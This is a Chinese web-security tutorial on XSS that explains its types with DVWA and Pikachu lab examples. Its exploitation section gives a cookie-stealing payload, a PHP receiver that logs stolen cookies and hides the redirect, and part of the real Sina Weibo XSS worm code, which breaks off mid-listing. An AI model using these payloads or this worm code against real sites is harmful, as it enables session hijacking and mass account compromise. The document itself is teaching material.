<p data-nodeid="53110" class="">你好，我是赢少良。从本讲开始，我将带你进入 Web 漏洞攻防的世界，学习一些常见的 Web 漏洞的原理、利用与防御。</p>
<p data-nodeid="53111">在这些常见的Web 漏洞中，XSS（Cross-site Script，跨站脚本）漏洞无疑是最多见的。根据 HackerOne 漏洞奖励平台发布的 <em data-nodeid="53284">The 2020 Hacker Report</em>，XSS 漏洞类型占所有报告漏洞中的 23％，排名第一。因此，在“<strong data-nodeid="53285">模块二：漏洞攻防案例</strong>”，我特意以 XSS 作为讲解的第一个漏洞类型。</p>
<p data-nodeid="53112"><img src="https://s0.lgstatic.com/i/image2/M01/03/7A/Cip5yF_cObWAcn2DAAEyh5k671U380.png" alt="Drawing 0.png" data-nodeid="53288"></p>
<div data-nodeid="53113"><p style="text-align:center">图 1：HackerOne 平台上报告的漏洞类型占比</p></div>
<h3 data-nodeid="53114">起源</h3>
<p data-nodeid="53115">最早的 XSS 漏洞可追溯到 1999 年末，微软安全工程师发现一些网站遭到攻击，网站被插入了一些恶意脚本和图像标签。随后，微软对此类漏洞进行研究分析，并在 2000 年 1 月，正式使用“cross-site scripting”这个名称，然后逐渐被业界采用，留传至今。</p>
<p data-nodeid="53116">跨站脚本（Cross-site Script），按理应该简称为 CSS，但为了与层叠样式表（CSS）区分开，特意改为 XSS。</p>
<p data-nodeid="53117">XSS 漏洞，通常指的是<strong data-nodeid="53297">网站对用户输入数据未做有效过滤，攻击者可以将恶意脚本注入网站页面中，达到执行恶意代码的目的</strong>。攻击者只需要诱使受害者打开特定的网址，就可以在受害者的浏览器中执行被注入的恶意代码，从而窃取用户身份，执行一些敏感操作，或是进行其他的危害行为。</p>
<h3 data-nodeid="53118">危害：绝不仅仅只是弹框</h3>
<p data-nodeid="53119">一些听过 XSS的同学，可能仅停留在弹框的印象里；我曾在修复此类漏洞时，只是简单地针对alert 函数做了下过滤。这都是对 XSS 攻防原理理解不够造成的误解。其实，只要你想象力够丰富，它的危害是可以造成很大的。</p>
<p data-nodeid="53120"><img src="https://s0.lgstatic.com/i/image2/M01/04/3D/Cip5yF_r7ISAKpGDAAE_SLFVjcU039.png" alt="图片1.png" data-nodeid="53302"></p>
<div data-nodeid="53121"><p style="text-align:center">图 2：常用于验证 XSS 漏洞的弹框</p></div>
<p data-nodeid="53122">比如 2005 年 10 月 4 日诞生的世界上第一个 XSS 蠕虫：Samy（作者的名字）。Samy 利用网络社交媒体 MySpace的XSS 漏洞传播，受害者会自动将 Samy 本人添加为关注者，并在受害者的用户页面显示一行字串“but most of all，samy is my hero”，并再次插入恶意代码，谁访问受害者的网页谁就会被感染。</p>
<p data-nodeid="53123">Samy 感染的用户呈指数倍增长，最终，超过 100 万用户被感染，作者也因事态发展失控而入狱，并被禁止 3 年内接触计算机，外加 90 小时的社区服务。</p>
<p data-nodeid="53124"><img src="https://s0.lgstatic.com/i/image2/M01/04/3F/CgpVE1_r7JCAF0j6AAXp8LneUp8609.png" alt="图片2.png" data-nodeid="53307"></p>
<div data-nodeid="53125"><p style="text-align:center">图 3：受 Samy 蠕虫攻击后，作者粉丝暴涨</p></div>
<p data-nodeid="53126"><img src="https://s0.lgstatic.com/i/image2/M01/04/3D/Cip5yF_r7JyAUiNUAAYMaTTY7f0311.png" alt="图片3.png" data-nodeid="53310"></p>
<div data-nodeid="53127"><p style="text-align:center">图 4：受 Samy 蠕虫攻击后，受害者的用户页面被篡改</p></div>
<p data-nodeid="53128">Samy 蠕虫是现实世界中 XSS 攻击的经典案例，除了蠕虫攻击外还有很多其他危害：盗号、钓鱼欺诈、篡改页面、刷广告流量、内网扫描、网页挂马、挖矿、键盘监听、窃取用户隐私等等。</p>
<p data-nodeid="53129">如果能充分利用好业务场景下的功能，再结合一定技术和想象力，XSS 所造成的危害绝不仅仅只是弹框。如果你是开发，在修复 XSS 漏洞过程中，也别单纯想着怎么防止弹框。更为全面的防御方案，我会在下一讲《05｜XSS：漏洞的检测与防御》中介绍。</p>
<h3 data-nodeid="53130">XSS 漏洞的分类</h3>
<p data-nodeid="53131">通常 XSS 分为存储型和反射型，但还有一种比较特殊的 DOM 型 XSS，它本身属于反射型 XSS，不过介绍的时候需要单独来讲。因此，我就按 3 种类型划分：反射型、存储型、DOM 型。</p>
<h4 data-nodeid="53132">反射型 XSS</h4>
<p data-nodeid="53133">我们首先来看反射型 XSS。反射型 XSS 又被称为非持久型跨站脚本，它是将攻击代码放在 URL 参数中，而不是存储到服务器，因此需要诱使用户点击才能触发攻击。</p>
<p data-nodeid="53134">以 DVWA 中的反射型 XSS 题目为例，通过向 name 参数输入以下代码即可触发漏洞：</p>
<pre class="lang-java" data-nodeid="53135"><code data-language="java">&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<p data-nodeid="53136"><img src="https://s0.lgstatic.com/i/image/M00/8C/65/CgqCHl_r7LKANa2yAAEJmWv_d8A830.png" alt="图片4.png" data-nodeid="53320"></p>
<div data-nodeid="53137"><p style="text-align:center">图5：利用 XSS 漏洞执行注入的JS代码</p></div>
<p data-nodeid="53138">在 Chrome 浏览器中，用“检查”功能看下网页源码，可以发现我们输入的代码被解析并执行了：</p>
<p data-nodeid="53139"><img src="https://s0.lgstatic.com/i/image/M00/8B/9D/Ciqc1F_cOeGAdXqVAAAh9BFmkfc434.png" alt="Drawing 5.png" data-nodeid="53324"></p>
<div data-nodeid="53140"><p style="text-align:center">图6：被解析执行的注入的代码</p></div>
<p data-nodeid="53141">其漏洞代码也非常简单。从 GET 参数 name 获取用户输入后，未经过滤就直接调用 echo 函数输出到页面，最终导致 XSS 的产生。漏洞代码如下：</p>
<pre class="lang-php" data-nodeid="53142"><code data-language="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">//&nbsp;Is&nbsp;there&nbsp;any&nbsp;input?</span>
<span class="hljs-keyword">if</span>(&nbsp;array_key_exists(&nbsp;<span class="hljs-string">"name"</span>,&nbsp;$_GET&nbsp;)&nbsp;&amp;&amp;&nbsp;$_GET[&nbsp;<span class="hljs-string">'name'</span>&nbsp;]&nbsp;!=&nbsp;<span class="hljs-literal">NULL</span>&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Feedback&nbsp;for&nbsp;end&nbsp;user</span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">echo</span>&nbsp;<span class="hljs-string">'&lt;pre&gt;Hello&nbsp;'</span>&nbsp;.&nbsp;$_GET[&nbsp;<span class="hljs-string">'name'</span>&nbsp;]&nbsp;.&nbsp;<span class="hljs-string">'&lt;/pre&gt;'</span>;
}
<span class="hljs-meta">?&gt;</span>
</code></pre>
<p data-nodeid="53143">有人认为反射型 XSS 的危害不如存储型 XSS，但我认为没有什么区别。这里的挑战主要是URL是否包含攻击代码。</p>
<h4 data-nodeid="53144">存储型 XSS</h4>
<p data-nodeid="53145">第二种 XSS 漏洞是存储型 XSS，它又被称为持久型跨站脚本。攻击者将恶意代码存储到服务器上，只要诱使受害者访问被插入恶意代码的页面即可触发。存储型 XSS 经常出现在一些可以发表评论的地方，如帖子、博客。</p>
<p data-nodeid="53146">在 DVWA 靶场中就有一个存储型 XSS 案例，它是个留言本的功能，支持用户发表评论，然后将用户输入的数据直接存储到数据库，并输出到页面上。这个过程中因为未做任何的过滤，导致了 XSS 漏洞的产生。</p>
<p data-nodeid="53147"><img src="https://s0.lgstatic.com/i/image/M00/8C/5A/Ciqc1F_r7NGAZEpfAAML5lu_1b0195.png" alt="图片5.png" data-nodeid="53332"></p>
<div data-nodeid="53148"><p style="text-align:center">图 7：DVWA 靶场中的存储型 XSS</p></div>
<p data-nodeid="53149"><strong data-nodeid="53337">存储型 XSS 的特点就是不需要在诱使用户访问的URL中包含攻击代码</strong>，因为它已经存储到了服务器中，只需要让用户访问包含输出攻击代码的页面即可，漏洞代码如下：</p>
<pre class="lang-php" data-nodeid="53150"><code data-language="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(&nbsp;<span class="hljs-keyword">isset</span>(&nbsp;$_POST[&nbsp;<span class="hljs-string">'btnSign'</span>&nbsp;]&nbsp;)&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Get&nbsp;input</span>
&nbsp;&nbsp;&nbsp;&nbsp;$message&nbsp;=&nbsp;trim(&nbsp;$_POST[&nbsp;<span class="hljs-string">'mtxMessage'</span>&nbsp;]&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;$name&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;trim(&nbsp;$_POST[&nbsp;<span class="hljs-string">'txtName'</span>&nbsp;]&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Sanitize&nbsp;message&nbsp;input</span>
&nbsp;&nbsp;&nbsp;&nbsp;$message&nbsp;=&nbsp;stripslashes(&nbsp;$message&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;$message&nbsp;=&nbsp;mysql_real_escape_string(&nbsp;$message&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Sanitize&nbsp;name&nbsp;input</span>
&nbsp;&nbsp;&nbsp;&nbsp;$name&nbsp;=&nbsp;mysql_real_escape_string(&nbsp;$name&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Update&nbsp;database</span>
&nbsp;&nbsp;&nbsp;&nbsp;$query&nbsp;&nbsp;=&nbsp;<span class="hljs-string">"INSERT&nbsp;INTO&nbsp;guestbook&nbsp;(&nbsp;comment,&nbsp;name&nbsp;)&nbsp;VALUES&nbsp;(&nbsp;'$message',&nbsp;'$name'&nbsp;);"</span>;
&nbsp;&nbsp;&nbsp;&nbsp;$result&nbsp;=&nbsp;mysql_query(&nbsp;$query&nbsp;)&nbsp;<span class="hljs-keyword">or</span>&nbsp;<span class="hljs-keyword">die</span>(&nbsp;<span class="hljs-string">'&lt;pre&gt;'</span>&nbsp;.&nbsp;mysql_error()&nbsp;.&nbsp;<span class="hljs-string">'&lt;/pre&gt;'</span>&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//mysql_close();</span>
}
<span class="hljs-meta">?&gt;</span>
</code></pre>
<p data-nodeid="53151">从 POST 参数中获取 mtxMessage 和 txtName 参数后，虽然经过一定过滤才插入到数据库中，但是中括号不会被过滤，在其他地方将其输出到页面后就会被解析（如图 5）。我们在 Message 中输入“<code data-backticks="1" data-nodeid="53339">&lt;script&gt;</code>alert(1)<code data-backticks="1" data-nodeid="53341">&lt;/script&gt;</code>”，点击“Sign Guestbook”提交，即可触发漏洞。</p>
<p data-nodeid="53152"><img src="https://s0.lgstatic.com/i/image/M00/8C/5B/Ciqc1F_r7U6AD8GlAADstIgZx_U342.png" alt="图片6.png" data-nodeid="53345"></p>
<div data-nodeid="53153"><p style="text-align:center">图 8：触发漏洞弹框</p></div>
<p data-nodeid="53154">利用 Chrome 浏览器的“检查”功能查看网页源码，可以发现刚才输入消息中的<code data-backticks="1" data-nodeid="53347">&lt;script&gt;</code>标签被解析了：</p>
<p data-nodeid="53155"><img src="https://s0.lgstatic.com/i/image2/M01/03/7A/Cip5yF_cOlSAfG1CAAAitat9u8o887.png" alt="Drawing 8.png" data-nodeid="53351"></p>
<div data-nodeid="53156"><p style="text-align:center">图 9：script 标签被解析</p></div>
<p data-nodeid="53157">正是它导致弹框的出现。</p>
<h4 data-nodeid="53158">DOM 型 XSS</h4>
<p data-nodeid="60576" class="">最后是 DOM 型 XSS 漏洞，它是基于文档对象模型（Document Object Model，DOM，用于将 Web 页面与脚本语言链接起来的标准编程接口）的一种漏洞，它不经过服务端，而是通过 URL 传入参数去触发，因此也属于反射型 XSS。</p>










<p data-nodeid="53160">由于客户端的 JavaScript 可以访问浏览器页面中的 DOM 对象，因此它能够决定如何处理当前页面的 URL，比如获取 URL 中的相关数据进行处理，然后动态更新到页面上。这导致 DOM 型 XSS 的漏洞代码常位于网页的 JavaScript 代码中。</p>
<p data-nodeid="53161">以 Pikachu 漏洞练习平台中的“DOM 型 XSS”题目为例：它只有一个文本输入框，外加一个“click me!”的按钮。我们先看下网页源码，看点击按钮后的回调函数。</p>
<p data-nodeid="53162"><img src="https://s0.lgstatic.com/i/image2/M01/03/7B/CgpVE1_cOmCAFLL8AAESjwfi8EI088.png" alt="Drawing 9.png" data-nodeid="53361"></p>
<div data-nodeid="53163"><p style="text-align:center">图 10：定位按钮的回调函数</p></div>
<p data-nodeid="53164">可以看到，点击后会执行一个叫 domxss 的函数。在源码内搜索下该函数。</p>
<p data-nodeid="53165"><img src="https://s0.lgstatic.com/i/image2/M01/04/3F/CgpVE1_r7WiAQMawAAJJrNlYAtg875.png" alt="图片7.png" data-nodeid="53365"></p>
<div data-nodeid="53166"><p style="text-align:center">图 11：domxss 函数</p></div>
<p data-nodeid="53167">domxss 函数就 2 行代码，第一行代码先通过 document.getElementById("text").value 获取 ID 为“text”的元素内容。其实这就是输入框的内容，输入框的 ID就叫“text”。</p>
<p data-nodeid="53168"><img src="https://s0.lgstatic.com/i/image2/M01/04/3F/CgpVE1_r7XKAWt3vAAFpOE6XpHM284.png" alt="图片8.png" data-nodeid="53373"></p>
<div data-nodeid="53169"><p style="text-align:center">图12：id 为 text 的输入框</p></div>
<p data-nodeid="53170">第二行代码是将获取的输入框内容传递给 ID 为“dom”的元素，并将其写入 innerHTML，也就是输出到 HTML 页面中，整个过程对用户输入数据都未做任何过滤。直接输入 test 看下：</p>
<p data-nodeid="53171"><img src="https://s0.lgstatic.com/i/image/M00/8B/A8/CgqCHl_cOnqAWzPrAACfVXHEAAk486.png" alt="Drawing 12.png" data-nodeid="53377"></p>
<div data-nodeid="53172"><p style="text-align:center">图13：用户数据的输出位置</p></div>
<p data-nodeid="53173">可以看到，输入框的内容输出到了 dom 元素中，作为 a 标签的链接地址。我们直接利用 JavaScript 伪协议来构造链接触发 JS 代码的执行，输入以下代码，然后点击“what do you see?”链接后即可触发漏洞：</p>
<pre class="lang-java" data-nodeid="53174"><code data-language="java">javascript:alert(<span class="hljs-number">1</span>)
</code></pre>
<p data-nodeid="53175"><img src="https://s0.lgstatic.com/i/image/M00/8B/A8/CgqCHl_cOoiAD43UAADLY39KIOc450.png" alt="Drawing 13.png" data-nodeid="53381"></p>
<div data-nodeid="53176"><p style="text-align:center">图 14：利用 javascript 伪协议触发漏洞</p></div>
<p data-nodeid="53177">导致 DOM 型 XSS 的相关 DOM 操作函数有很多，这里我只是举了比较常见的 innerHTML 属性设置导致的漏洞为例子，其他的还有像 eval、document.write 等可触发漏洞的数据输出位置。</p>
<p data-nodeid="53178">网上曾有人整理了一份关于 DOM XSS 的数据污染源（Source，即用户输入数据）和漏洞触发点（Sink）的列表（虽然不够全面，但可以作为参考），如下图所示：<br>
<img src="https://s0.lgstatic.com/i/image2/M01/03/7A/Cip5yF_cOp-Acv-zAANwGCdez2k054.png" alt="Drawing 14.png" data-nodeid="53387"></p>
<div data-nodeid="53179"><p style="text-align:center">图 15：DOM XSS Sources &amp; Sinks</p></div>
<p data-nodeid="53180">若数据从 Source 传到 Sink 过程中，未做任何过滤，就有可能存在 DOM XSS。这个思路也常作为动静态检测 DOM XSS 的重要思路，具体会在下一讲中介绍。</p>
<h3 data-nodeid="53181">攻击 XSS 漏洞</h3>
<p data-nodeid="53182">这里开始我想给你介绍一些关于 XSS 漏洞利用的方法，避免你停留在 XSS 只能弹框的思想层面。</p>
<p data-nodeid="53183">针对 XSS 漏洞最为常见的两种攻击方式就是窃取 Cookie 劫持他人的会话，以及前面介绍过的蠕虫攻击。因此，这里会重点介绍这两者的相关技术，同时也涉及一些其他的攻击思路，最后会引出一些自动化利用工具的使用。</p>
<h4 data-nodeid="53184">窃取 Cookie</h4>
<p data-nodeid="53185">我们首先来看“窃取 Cookie”。</p>
<p data-nodeid="53186">Cookie 是由服务器提供的存储在客户端的数据，允许 JavaScript 访问，常用于识别用户身份和保存会话等功能。如果 Web 应用程序存在 XSS 漏洞，那么攻击者通过注入恶意 JavaScript 脚本就可以窃取到 Cookie，进而以用户身份执行恶意操作。</p>
<p data-nodeid="53187">通过 document.cookie 就可以访问到 Cookie。以百度网站为例，在检查工具中的 Console 标签页输入 document.cookie 就可以看到当前百度域名下的 Cookie 值。</p>
<p data-nodeid="53188"><img src="https://s0.lgstatic.com/i/image2/M01/03/7A/Cip5yF_cOpiAMrRcAACz4ZPfiHE961.png" alt="Drawing 15.png" data-nodeid="53398"></p>
<div data-nodeid="53189"><p style="text-align:center">图 16：百度 Cookie</p></div>
<p data-nodeid="53190">当一个网站存在 XSS 时，我们就可以通过执行 document.cookie 获取当前受害者的 cookie，前提是要先诱使受害者访问特定的 URL。</p>
<p data-nodeid="53191">以 Pikachu 中的反射型 XSS(Get) 题目为例，其触发链接为：</p>
<pre class="lang-java" data-nodeid="53192"><code data-language="java">http:<span class="hljs-comment">//localhost/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=submit</span>
</code></pre>
<p data-nodeid="53193">访问后的效果：</p>
<p data-nodeid="53194"><img src="https://s0.lgstatic.com/i/image2/M01/03/7A/Cip5yF_cOraARaEHAACAgMxORjM038.png" alt="Drawing 16.png" data-nodeid="53404"></p>
<div data-nodeid="53195"><p style="text-align:center">图 17：Pikachu 中的反射型 XSS(Get) 利用</p></div>
<p data-nodeid="53196">我们试试看能否读取 cookie：</p>
<pre class="lang-java" data-nodeid="53197"><code data-language="java">http:<span class="hljs-comment">//localhost/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;submit=submit</span>
</code></pre>
<p data-nodeid="53198">可以访问到 cookie：<br>
<img src="https://s0.lgstatic.com/i/image2/M01/04/3F/CgpVE1_r7PeAeYKNAAKRGDzBTuE416.png" alt="图片10.png" data-nodeid="53410"></p>
<div data-nodeid="53199"><p style="text-align:center">图 18：成功通过 JS 读取 Cookie</p></div>
<p data-nodeid="53200">接下来，我们就可以在自己控制的服务器写个接收 cookie 的接口，比如 cookie.php。刚好 Pikachu 靶场自带这样的功能，我以它为例，并加了关键代码的注释：</p>
<pre class="lang-php" data-nodeid="53201"><code data-language="php"><span class="hljs-meta">&lt;?php</span>
	<span class="hljs-keyword">include_once</span> <span class="hljs-string">'../inc/config.inc.php'</span>;
	<span class="hljs-keyword">include_once</span> <span class="hljs-string">'../inc/mysql.inc.php'</span>;
	$link=connect();  <span class="hljs-comment">// 连接数据库</span>
	
	<span class="hljs-comment">//这个是获取 cookie 的 api 页面</span>
	<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cookie'</span>])){  <span class="hljs-comment">// 通过 GET 参数 cookie 来接收数据</span>
	    $time=date(<span class="hljs-string">'Y-m-d g:i:s'</span>);
	    $ipaddress=getenv (<span class="hljs-string">'REMOTE_ADDR'</span>);
	    $cookie=$_GET[<span class="hljs-string">'cookie'</span>];
	    $referer=$_SERVER[<span class="hljs-string">'HTTP_REFERER'</span>];
	    $useragent=$_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>];
	    $query=<span class="hljs-string">"insert cookies(time,ipaddress,cookie,referer,useragent) 
	    values('$time','$ipaddress','$cookie','$referer','$useragent')"</span>;
	    $result=mysqli_query($link, $query); <span class="hljs-comment">// 将窃取的数据存入数据库</span>
	}
	header(<span class="hljs-string">"Location:http://192.168.1.4/pikachu/index.php"</span>);<span class="hljs-comment">//重定向到一个可信的网站，主要起到隐藏作用，避免被发现</span>
	
	<span class="hljs-meta">?&gt;</span>
</code></pre>
<p data-nodeid="53202">这个 cookie.php 通过 GET 参数 cookie 来接收数据，那我们向它传递 document.cookie 的值就可以窃取想要的 cookie 了。基于此，我们重新构造 URL。</p>
<p data-nodeid="53203"><strong data-nodeid="53417">注意要做 URL 编码，否则“+”连接符会被吃掉，导致无法窃取 cookie</strong>。</p>
<pre class="lang-java" data-nodeid="53204"><code data-language="java">http:<span class="hljs-comment">//localhost/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2Flocalhost%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span>
</code></pre>
<p data-nodeid="53205">我们打开 http://localhost/pkxss/pkxss_login.php 上 XSS 后台（第一次使用时按提示点安装，然后用默认帐密登录：admin/123456），可以看到已经成功窃取到Cookie：</p>
<p data-nodeid="53206"><img src="https://s0.lgstatic.com/i/image/M00/8C/0E/CgqCHl_kTAmAQB_aAAEDK3yLJkY943.png" alt="图片11.png" data-nodeid="53423"></p>
<div data-nodeid="53207"><p style="text-align:center">图 19：窃取到 Cookie</p></div>
<p data-nodeid="53208">网上也有很多开源的 XSS 平台用来接收 Cookie，你在GitHub 搜索就可以找到很多，大多数可以直接通过 Docker 快速安装。</p>
<p data-nodeid="53209"><img src="https://s0.lgstatic.com/i/image/M00/8B/9D/Ciqc1F_cOtaASyQeAAHRnEyplEU737.png" alt="Drawing 19.png" data-nodeid="53427"></p>
<div data-nodeid="53210"><p style="text-align:center">图 20：各种开源的 XSS 利用平台</p></div>
<p data-nodeid="67650" class="">获取 Cookie 后，我们就可以本地修改 Cookie 来登录受害者的账号（除非刚好窃取的 Cookie 不包含用户登录信息，比如未登录状态下访问的攻击链接），可以使用 Chrome 插件 EditThisCookie 来设置窃取的 Cookie：</p>









<p data-nodeid="53212"><img src="https://s0.lgstatic.com/i/image2/M01/04/3F/CgpVE1_r7hmATCQBAAHhyKThdOI750.png" alt="图片13.png" data-nodeid="53431"></p>
<div data-nodeid="53213"><p style="text-align:center">图 21：EditThisCookie</p></div>
<p data-nodeid="53214">还有另一款早期业界比较常用的工具，叫“桂林老兵 Cookie 欺骗工具”，以及在《01 | 武器库：常用的渗透测试工具》中介绍的 Burp Suite，它们均支持修改 Cookie。</p>
<h4 data-nodeid="53215">蠕虫攻击</h4>
<p data-nodeid="53216">前面我介绍了 Samy 蠕虫，但并没有谈到XSS 蠕虫的实现技术。XSS 蠕虫的实现正是得益于Ajax 技术的出现，而后者正是 Web2.0 的标志性技术。</p>
<p data-nodeid="53217">Ajax（Asynchronous JavaScript and XML，异步 JavaScript 和 XML）是指一种<strong data-nodeid="53442">创建交互式网页应用的网页开发技术</strong>。这个概念比较抽象，具体讲就是在我们浏览网页，做一些操作时，可以减少浏览器的一些页面重绘操作，避免出现页面抖动、闪现之类的不适体验。这也正是 Web2.0 带来的改变。</p>
<p data-nodeid="53218">Ajax 中的核心技术就是 XMLHttpRequest，它允许 JavaScript 脚本与服务器进行通信，在不刷新页面的情况下，向服务器发送请求或是接收服务器的响应数据。</p>
<p data-nodeid="53219">下面我以之前影响比较大的新浪微博 XSS 蠕虫攻击事件为例，介绍 Ajax 技术在 XSS 蠕虫中的应用，从攻击代码来详细讲解。</p>
<p data-nodeid="53220"><img src="https://s0.lgstatic.com/i/image/M00/8B/9D/Ciqc1F_cOu-AUgG8AAMoVNqvtj8470.png" alt="Drawing 21.png" data-nodeid="53447"></p>
<div data-nodeid="53221"><p style="text-align:center">图 22   ：新浪微博上感染 XSS 蠕虫的用户</p></div>
<p data-nodeid="53222">2011年 6 月 28 日，新浪微博遭受 XSS 蠕虫的攻击，很多受害者被迫发布带有攻击链接的私信和微博。这些消息都带有一定的诱惑性，其他用户点击后也会此影响。受害者在感染后，都会自动关注一位名为“hellosamy”的微博用户（估计是效仿 Samy 蠕虫），然后向关注受害者的用户发送含有同样链接地址的私信，并发布含攻击链接的微博。得益于这种传播方式，在16 分钟内病毒就感染了33000 个用户。</p>
<p data-nodeid="53223">我们来分析下新浪微博的 XSS 蠕虫代码：</p>
<pre class="lang-javascript" data-nodeid="53224"><code data-language="javascript"><span class="hljs-comment">// 创建 XMLHttp 对象用于收发请求</span>
<span class="hljs-function"><span class="hljs-keyword">function</span>&nbsp;<span class="hljs-title">createXHR</span>(<span class="hljs-params"></span>)</span>{&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-built_in">window</span>.XMLHttpRequest?
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">new</span>&nbsp;XMLHttpRequest():
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">new</span>&nbsp;ActiveXObject(<span class="hljs-string">"Microsoft.XMLHTTP"</span>);
}
<span class="hljs-function"><span class="hljs-keyword">function</span>&nbsp;<span class="hljs-title">getappkey</span>(<span class="hljs-params">url</span>)</span>{
&nbsp;&nbsp;&nbsp;&nbsp;xmlHttp&nbsp;=&nbsp;createXHR();
&nbsp;&nbsp;&nbsp;&nbsp;xmlHttp.open(<span class="hljs-string">"GET"</span>,url,<span class="hljs-literal">false</span>);&nbsp;<span class="hljs-comment">//获取 AppKey 不采用异步执行,等待请求返回 </span>
&nbsp;&nbsp;&nbsp;&nbsp;xmlHttp.send();
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;xmlHttp.responseText;
&nbsp;&nbsp;&nbsp;&nbsp;id_arr&nbsp;=&nbsp;<span class="hljs-string">''</span>;
    <span class="hljs-comment">// 正则匹配出 AppKey 数组,包含每个被收听用户的 uid&nbsp;</span>
&nbsp;&nbsp;&nbsp;&nbsp;id&nbsp;=&nbsp;result.match(<span class="hljs-regexp">/namecard=\"true\"&nbsp;title=\"[^\"]*/g</span>);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https:<span class="hljs-comment">//beefproject.com/</span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;id.length;i++){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sum&nbsp;=&nbsp;id[i].toString().split(<span class="hljs-string">'"'</span>)[<span class="hljs-number">3</span>];  <span class="hljs-comment">//重新提取整理</span>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;id_arr&nbsp;+=&nbsp;sum&nbsp;+&nbsp;<span class="hljs-string">'||'</span>;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;id_arr;
}
<span class="hljs-function"><span class="hljs-keyword">function</span>&nbsp;<span class="hljs-title">random_msg</span>(<span class="hljs-params"></span>)</span>{

    <span class="hljs-comment">// 使用短地址服务，构造 XSS 传播连接，隐藏自己的恶意 js 脚本，</span>
    <span class="hljs-comment">// 这里正是 XSS 漏洞的触发位置</span>
 <span class="hljs-comment">//http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=upd</span>
&nbsp;&nbsp;&nbsp;&nbsp;link&nbsp;=&nbsp;<span class="hljs-string">'&nbsp;http://163.fm/PxZHoxn?id='</span>&nbsp;+&nbsp;<span class="hljs-keyword">new</span>&nbsp;<span class="hljs-built_in">Date</span>().getTime();;
    <span class="hljs-comment">// 话题列表&nbsp;</span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">var</span>&nbsp;msgs&nbsp;=&nbsp;[
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'郭美美事件的一些未注意到的细节：'</span>,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'建党大业中穿帮的地方：'</span>,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'让女人心动的 100 句诗歌：'</span>,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'3D 肉团团高清普通话版种子：'</span>,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'这是传说中的神仙眷侣啊：'</span>,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'惊爆!范冰冰艳照真流出了：'</span>,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'杨幂被爆多次被潜规则:'</span>,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'傻仔拿锤子去抢银行：'</span>,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'可以监听别人手机的软件：'</span>,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">'个税起征点有望提到 4000：'</span>]; 

    <span class="hljs-comment">//随机选取话题,加上之前的传播连接作为微博内容&nbsp;</span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">var</span>&nbsp;msg&nbsp;=&nbsp;msgs[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random()*msgs.length)]&nbsp;+&nbsp;link;
&nbsp;&nbsp;&nbsp;&nbsp;msg&nbsp;=&nbsp;<span class="hljs-built_in">encodeURIComponent</span>(msg);&nbsp;<span class="hljs-comment">//对内容进行 Url 编码</span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;msg;
}
<span class="hljs-comment">// 利用 Ajax 发送 POST 请求</span>
